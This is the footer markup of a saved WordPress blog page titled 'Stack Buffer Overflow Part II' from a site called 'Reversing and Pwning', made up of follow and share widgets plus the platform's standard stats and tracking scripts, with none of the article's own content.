</div><div id="actionbar" class="actnbr-pub-independent-publisher-2 actnbr-has-follow actnbr-hidden"><ul><li class="actnbr-btn actnbr-hidden"> 			    	<a class="actnbr-action actnbr-actn-follow" href=""><svg class="gridicon gridicon__follow" height="24px" width="24px" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M23 16v2h-3v3h-2v-3h-3v-2h3v-3h2v3h3zM20 2v9h-4v3h-3v4H4c-1.1 0-2-.9-2-2V2h18zM8 13v-1H4v1h4zm3-3H4v1h7v-1zm0-2H4v1h7V8zm7-4H4v2h14V4z"></path></g></svg><span>Follow</span></a> 			    	<div class="actnbr-popover tip tip-top-left actnbr-notice"> 			    		<div class="tip-arrow"></div> 			    		<div class="tip-inner actnbr-follow-bubble"></div> 			    	</div> 			    </li><li class="actnbr-ellipsis actnbr-hidden"> 			  <svg class="gridicon gridicon__ellipsis" height="24" width="24" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><circle cx="5" cy="12" r="2"></circle><circle cx="19" cy="12" r="2"></circle><circle cx="12" cy="12" r="2"></circle></g></svg> 			  <div class="actnbr-popover tip tip-top-left actnbr-more"> 			  	<div class="tip-arrow"></div> 			  	<div class="tip-inner"> 				  <ul> 				    <li class="actnbr-sitename actnbr-hidden"><a href="http://reversingpwn.wordpress.com/"><img alt="" src="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/wpcom-gray-white.png" class="avatar avatar-50" width="50" height="50"> Reversing and Pwning</a></li> 				   	<li class="actnbr-folded-customize actnbr-hidden"><a href="https://reversingpwn.wordpress.com/wp-admin/customize.php?url=https%3A%2F%2Freversingpwn.wordpress.com%2F2017%2F07%2F08%2Fstack-buffer-overflow-part-ii%2F%3Frelatedposts_hit%3D1%26relatedposts_origin%3D67%26relatedposts_position%3D0"><svg class="gridicon gridicon__customize" height="20px" width="20px" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M2 6c0-1.505.78-3.08 2-4 0 .845.69 2 2 2 1.657 0 3 1.343 3 3 0 .386-.08.752-.212 1.09.74.594 1.476 1.19 2.19 1.81L8.9 11.98c-.62-.716-1.214-1.454-1.807-2.192C6.753 9.92 6.387 10 6 10c-2.21 0-4-1.79-4-4zm12.152 6.848l1.34-1.34c.607.304 1.283.492 2.008.492 2.485 0 4.5-2.015 4.5-4.5 0-.725-.188-1.4-.493-2.007L18 9l-2-2 3.507-3.507C18.9 3.188 18.225 3 17.5 3 15.015 3 13 5.015 13 7.5c0 .725.188 1.4.493 2.007L3 20l2 2 6.848-6.848c1.885 1.928 3.874 3.753 5.977 5.45l1.425 1.148 1.5-1.5-1.15-1.425c-1.695-2.103-3.52-4.092-5.448-5.977z" data-reactid=".2.1.1:0.1b.0"></path></g></svg><span>Customize<span></span></span></a></li> 				    <li class="actnbr-folded-follow actnbr-hidden"><a class="actnbr-action actnbr-actn-follow" href=""><svg class="gridicon gridicon__follow" height="24px" width="24px" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M23 16v2h-3v3h-2v-3h-3v-2h3v-3h2v3h3zM20 2v9h-4v3h-3v4H4c-1.1 0-2-.9-2-2V2h18zM8 13v-1H4v1h4zm3-3H4v1h7v-1zm0-2H4v1h7V8zm7-4H4v2h14V4z"></path></g></svg><span>Follow</span></a></li> 					<li class="actnbr-signup actnbr-hidden"><a href="https://wordpress.com/start/">Sign up</a></li> 				    <li class="actnbr-login actnbr-hidden"><a href="https://wordpress.com/log-in?redirect_to=https%3A%2F%2Freversingpwn.wordpress.com%2F2017%2F07%2F08%2Fstack-buffer-overflow-part-ii%2F&amp;signup_flow=account">Log in</a></li> 				     				    <li class="actnbr-shortlink actnbr-hidden"><a href="https://wp.me/p8T98y-1h">Copy shortlink</a></li> 				    <li class="flb-report actnbr-hidden"><a href="http://en.wordpress.com/abuse/">Report this content</a></li> 				     				     				    <li class="actnbr-subs actnbr-hidden"><a href="https://subscribe.wordpress.com/">Manage subscriptions</a></li> 				    <li class="actnbr-fold actnbr-hidden"><a href="">Collapse this bar</a></li> 			      </ul> 			    </div> 		      </div> 		    </li> 	      </ul></div>
<script type="text/javascript">
var windowOpen;
			jQuery( document.body ).on( 'click', 'a.share-twitter', function() {
				// If there's another sharing window open, close it.
				if ( 'undefined' !== typeof windowOpen ) {
					windowOpen.close();
				}
				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
				return false;
			});
var windowOpen;
			jQuery( document.body ).on( 'click', 'a.share-facebook', function() {
				// If there's another sharing window open, close it.
				if ( 'undefined' !== typeof windowOpen ) {
					windowOpen.close();
				}
				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
				return false;
			});
</script>
<script type="text/javascript">
// <![CDATA[
(function() {
try{
  if ( window.external &&'msIsSiteMode' in window.external) {
    if (window.external.msIsSiteMode()) {
      var jl = document.createElement('script');
      jl.type='text/javascript';
      jl.async=true;
      jl.src='/wp-content/plugins/ie-sitemode/custom-jumplist.php';
      var s = document.getElementsByTagName('script')[0];
      s.parentNode.insertBefore(jl, s);
    }
  }
}catch(e){}
})();
// ]]>
</script>		<iframe src="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/master.html" scrolling="no" id="likes-master" name="likes-master" style="display:none;"></iframe>
		<div id="likes-other-gravatars"><div class="likes-text"><span>%d</span> bloggers like this:</div><ul class="wpl-avatars sd-like-gravatars"></ul></div>
<script src="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/w.js" type="text/javascript" async="" defer="defer"></script>
<script type="text/javascript">
_tkq = window._tkq || [];
_stq = window._stq || [];
_tkq.push(['storeContext', {'blog_id':'131353854','blog_tz':'7','user_lang':'en','blog_lang':'en','user_id':'0'}]);
_stq.push(['view', {'blog':'131353854','v':'wpcom','tz':'7','user_id':'0','post':'79','subd':'reversingpwn'}]);
_stq.push(['extra', {'crypt':'UE5XaGUuOTlwaD85flAmcm1mcmZsaDhkV11YdWFnNncxc1tjZG9XVXhRU08rYjIuSnFPfDlleVYlYTlXcmNlJk1lXXhsLlVnaFA4SmhsVnlPVFVSTD8zZHM/aHhwcmkmQ19Uc1BBcm9GdzFJeDZhV0hWXSVrME8udlB5RFRNNHxBRno1NS5hXV9pbkd8OG9jYVREK3d+LVBlJV8wRlY3fklWTFp5VlQ3PT1DZ29+M0FvbWdyVFVvbHQ/YjglUVAmYWVCK2pRNG9nVXg9Z0I9P1graHFrLHBBVSUmcCx5bjhsQU5XUDhJc3VTOUh6QjVpczNyYmFDRThlSHYuRjdbeWtVcFtrcUQzeUV1bklfL2lsM1hFT3VXJiU='}]);
_stq.push([ 'clickTrackerInit', '131353854', '79' ]);
	</script>
<noscript><img src="https://pixel.wp.com/b.gif?v=noscript" style="height:0px;width:0px;overflow:hidden" alt="" /></noscript>
		<script defer="defer" src="data:text/javascript,%21function%28%29%7B%22use%20strict%22%3Bvar%20e%3D%5B%5D%2Ct%3D%22wpcom.simple.ttfb.batcache.%22%3Btry%7Bfor%28var%20n%3Dperformance.getEntriesByType%28%22navigation%22%29%5B0%5D%7C%7C%7B%7D%2Co%3D0%2Cs%3Ddocument.body.childNodes%2Cc%3Ds.length-1%3Bc%3E%3D0%3Bc--%29s%5Bc%5D.nodeType%3D%3D%3DNode.COMMENT_NODE%26%26s%5Bc%5D.textContent.indexOf%28%22served%20from%20batcache%22%29%3E0%26%26%28o%3D1%29%3Bvar%20r%3DMath.round%28n.responseStart%7C%7C0%29%3Bif%28r%3E0%26%26%28o%3Fe.push%28t%2B%22hit%3A%22%2Br%2B%22%7Cms%22%29%3Ae.push%28t%2B%22miss%3A%22%2Br%2B%22%7Cms%22%29%29%2Ce.length%29document.createElement%28%22img%22%29.src%3D%22https%3A%2F%2Fpixel.wp.com%2Fboom.gif%3Fjson%3D%22%2BencodeURIComponent%28JSON.stringify%28%7Bbeacons%3Ae%7D%29%29%7Dcatch%28e%29%7B%7D%7D%28%29%3B"></script>
		<script>
if ( 'object' === typeof wpcom_mobile_user_agent_info ) {

	wpcom_mobile_user_agent_info.init();
	var mobileStatsQueryString = "";
	
	if( false !== wpcom_mobile_user_agent_info.matchedPlatformName )
		mobileStatsQueryString += "&x_" + 'mobile_platforms' + '=' + wpcom_mobile_user_agent_info.matchedPlatformName;
	
	if( false !== wpcom_mobile_user_agent_info.matchedUserAgentName )
		mobileStatsQueryString += "&x_" + 'mobile_devices' + '=' + wpcom_mobile_user_agent_info.matchedUserAgentName;
	
	if( wpcom_mobile_user_agent_info.isIPad() )
		mobileStatsQueryString += "&x_" + 'ipad_views' + '=' + 'views';

	if( "" != mobileStatsQueryString ) {
		new Image().src = document.location.protocol + '//pixel.wp.com/g.gif?v=wpcom-no-pv' + mobileStatsQueryString + '&baba=' + Math.random();
	}
	
}
</script>


<img src="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/g.gif" alt=":)" id="wpstats"><div class="comment-likes-overlay" style="display: none;"></div><script src="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/725X1342.js"></script><iframe id="skimlinks-pixels-iframe" style="display: none;" width="0" height="0"></iframe></body></html>